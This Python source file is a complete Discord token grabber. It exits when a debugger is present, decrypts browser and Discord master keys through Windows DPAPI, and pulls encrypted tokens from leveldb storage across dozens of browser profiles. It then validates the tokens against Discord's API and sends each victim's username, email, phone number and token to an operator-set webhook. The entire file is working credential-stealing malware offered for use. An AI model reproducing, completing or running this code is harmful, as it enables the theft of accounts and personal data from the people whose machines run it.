import os
import sys
import re
import json
import base64
import time
import ctypes
import threading
import getpass
import requests
import win32crypt
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from datetime import datetime, timezone

#------------------------------------------------------
WEBHOOK = ""  # Set your webhook
#-------------------------------------------------------
USERNAME = "Token Grabber"
AVATAR = ""
LOCAL_USER = getpass.getuser()
DEBUG = True
def log(msg):
    if DEBUG:
        print(msg)
def anti_debug():
    if ctypes.windll.kernel32.IsDebuggerPresent():
        sys.exit(0)
def send_webhook(content, title=None):
    payload = {
    "username": USERNAME,
    "avatar_url": AVATAR,
    "content": "@everyone",
    "embeds": [{
        "description": content
    }]
}
    if title:
        payload["embeds"][0]["title"] = title
    try:
        requests.post(WEBHOOK, json=payload, timeout=5)
    except:
        pass
def get_master_key(state_path):
    if not os.path.exists(state_path):
        return None
    try:
        with open(state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        enc_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except Exception as e:
        log(f"Failed {state_path} — {e}")
        return None
def decrypt_token(cipher, payload):
    try:
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return None
def extract_tokens(leveldb_dir, key):
    tokens = []
    pattern = re.compile(r'dQw4w9WgXcQ:[^"\\\']+')
    if not os.path.isdir(leveldb_dir):
        return []
    for file in os.listdir(leveldb_dir):
        if not file.endswith((".log", ".ldb")):
            continue
        try:
            with open(os.path.join(leveldb_dir, file), "r", errors="ignore") as f:
                for line in f:
                    for match in pattern.findall(line):
                        try:
                            token_data = base64.b64decode(match.split(":")[1])
                            iv = token_data[3:15]
                            payload = token_data[15:]
                            cipher = AES.new(key, AES.MODE_GCM, iv)
                            token = decrypt_token(cipher, payload)
                            if token and token not in tokens:
                                tokens.append(token)
                        except:
                            continue
        except:
            continue
    return tokens
def find_tokens():
    targets = {
    "Discord": os.path.expandvars("%APPDATA%\\Discord"),
    "Discord Canary": os.path.expandvars("%APPDATA%\\discordcanary"),
    "Discord PTB": os.path.expandvars("%APPDATA%\\discordptb"),
    "Lightcord": os.path.expandvars("%APPDATA%\\Lightcord"),
    "Ripcord": os.path.expandvars("%APPDATA%\\Ripcord"),
    "Chrome Default": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default"),
    "Chrome Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 1"),
    "Chrome Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 2"),
    "Chrome Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Profile 3"),
    "Chrome System": os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\System Profile"),
    "Brave Default": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Default"),
    "Brave Profile 1": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1"),
    "Brave Profile 2": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2"),
    "Brave Profile 3": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3"),
    "Brave System": os.path.expandvars("%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data\\System Profile"),
    "Opera Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Stable"),
    "Opera GX Stable": os.path.expandvars("%APPDATA%\\Opera Software\\Opera GX Stable"),
    "Opera Next": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Next"),
    "Opera Developer": os.path.expandvars("%APPDATA%\\Opera Software\\Opera Developer"),
    "Opera Portable": os.path.expandvars("%USERPROFILE%\\Downloads\\OperaPortable\\Data\\profile"),
    "Edge Default": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default"),
    "Edge Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 1"),
    "Edge Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 2"),
    "Edge Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Profile 3"),
    "Edge System": os.path.expandvars("%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\System Profile"),
    "Vivaldi Default": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Default"),
    "Vivaldi Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 1"),
    "Vivaldi Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 2"),
    "Vivaldi Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\Profile 3"),
    "Vivaldi System": os.path.expandvars("%LOCALAPPDATA%\\Vivaldi\\User Data\\System Profile"),
    "Yandex Default": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default"),
    "Yandex Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 1"),
    "Yandex Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 2"),
    "Yandex Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Profile 3"),
    "Yandex System": os.path.expandvars("%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\System Profile"),
    "Chromium Default": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Default"),
    "Chromium Profile 1": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 1"),
    "Chromium Profile 2": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 2"),
    "Chromium Profile 3": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\Profile 3"),
    "Chromium System": os.path.expandvars("%LOCALAPPDATA%\\Chromium\\User Data\\System Profile"),
    "Firefox Profiles": os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles"),
    }
    all_tokens = []
    for name, raw in targets.items():
        base_path = os.path.expandvars(raw)
        state_path = os.path.join(base_path, "Local State")
        leveldb = os.path.join(base_path, "Local Storage", "leveldb")
        if not os.path.exists(state_path) or not os.path.exists(leveldb):
            continue
        key = get_master_key(state_path)
        if key:
            tokens = extract_tokens(leveldb, key)
            all_tokens.extend(tokens)
    return all_tokens
def validate_and_send(tokens):
    for token in tokens:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
            if r.status_code == 200:
                user = r.json()
                user_id = base64.b64decode(token.split('.')[0] + '==').decode("utf-8", errors="ignore")
                msg = (
                    f"🧑 **Discord Username**: `{user['username']}#{user['discriminator']}`\n"
                    f"🆔 **User ID**: `{user_id}`\n"
                    f"📧 **Discord Email**: `{user.get('email', 'N/A')}`\n"
                    f"📱 **Phone Number**: `{user.get('phone', 'N/A')}`\n"
                    f"🔑 **Discord Token**: `{token}`\n"
                    f"🐙 **GitHub** https://github.com/deadconvicess/Discord-Token-Logger"
                )
                send_webhook(msg, title="Token Logged")
        except Exception as e:
            log(f"failed {e}")
if __name__ == "__main__":
    anti_debug()
    tokens = find_tokens()
    validate_and_send(tokens)
    while True:
        time.sleep(1)
